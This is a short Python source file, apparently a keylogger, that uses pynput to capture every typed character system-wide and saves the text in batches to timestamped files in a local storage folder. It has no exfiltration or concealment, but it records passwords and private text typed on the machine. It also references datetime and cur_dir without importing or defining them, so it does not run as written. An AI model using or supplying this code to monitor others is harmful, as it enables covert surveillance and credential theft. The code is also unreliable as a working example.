import re
from pynput import keyboard

def get_strokes():
    global prev_keys

    prev_keys = []
    def on_press(key):
        global prev_keys

        try:
            prev_keys.append(format(key.char))
            if len(prev_keys) >1000:
                write_strokes(prev_keys)
                prev_keys = []
                
        except AttributeError:
            pass  
    with keyboard.Listener(
            on_press=on_press) as listener:
        listener.join()
        
def write_strokes(keys):
    arch_tex_dir = cur_dir+'\\arch_text_storage\\'
    now = datetime.datetime.now().strftime ("%Y-%m-%d_%H_%M_%S")
    with open(arch_tex_dir+now+'.txt', 'a') as f:
        f.write(''.join(keys)+'\n')